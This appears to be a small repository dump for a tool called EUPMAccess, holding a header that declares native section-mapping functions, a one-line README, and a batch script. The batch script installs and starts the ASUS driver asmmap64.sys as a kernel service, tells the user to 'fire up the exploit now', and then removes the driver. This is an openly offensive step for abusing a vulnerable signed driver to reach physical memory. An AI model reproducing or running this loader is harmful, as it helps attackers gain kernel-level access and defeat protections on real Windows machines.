`EnablePhysicalMemory/ntdll.h`:

```h
#pragma once
#include <windows.h>
#include <winternl.h>

typedef enum _SECTION_INHERIT { ViewShare = 1, ViewUnmap = 2 } SECTION_INHERIT, *PSECTION_INHERIT;

extern "C" NTSTATUS NTAPI	ZwOpenSection(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
extern "C" NTSTATUS NTAPI	ZwMapViewOfSection(_In_ HANDLE SectionHandle, _In_ HANDLE ProcessHandle,
											   _Inout_ PVOID BaseAddress, _In_ ULONG_PTR ZeroBits, _In_ SIZE_T CommitSize,
											   _Inout_opt_ PLARGE_INTEGER SectionOffset, _Inout_ PSIZE_T ViewSize,
											   _In_ SECTION_INHERIT InheritDisposition, _In_ ULONG AllocationType,
											   _In_ ULONG Win32Protect);
extern "C" NTSTATUS NTAPI	ZwUnmapViewOfSection(_In_ HANDLE ProcessHandle, _In_opt_ PVOID BaseAddress);

#pragma comment(lib, "ntdll.lib")

```

`README.md`:

```md
# EUPMAccess

Works only on x64 version of Windows 7, 8, 8.1, 10 included

```

`asus.bat`:

```bat
@echo off
copy "%~dp0\asmmap64.sys" "%WINDIR%\system32\drivers\asmmap64.sys"
sc create asmmap64 binPath= system32\drivers\asmmap64.sys type= kernel
sc start asmmap64
echo Driver loaded, fire up the exploit now then press a key when exploit has been done.
echo If you see any access denied, close this and relaunch the bat as Administrator.
echo DO NOT PRESS ANY KEY UNTIL YOU HAVE FINISHED LAUNCHING THE EXPLOIT
pause
PING localhost -n 2 >NUL
sc stop asmmap64
sc delete asmmap64
del "%WINDIR%\system32\drivers\asmmap64.sys"
PING localhost -n 2 >NUL
sc stop asmmap64
sc delete asmmap64
del "%WINDIR%\system32\drivers\asmmap64.sys"
PING localhost -n 2 >NUL
echo Cya

```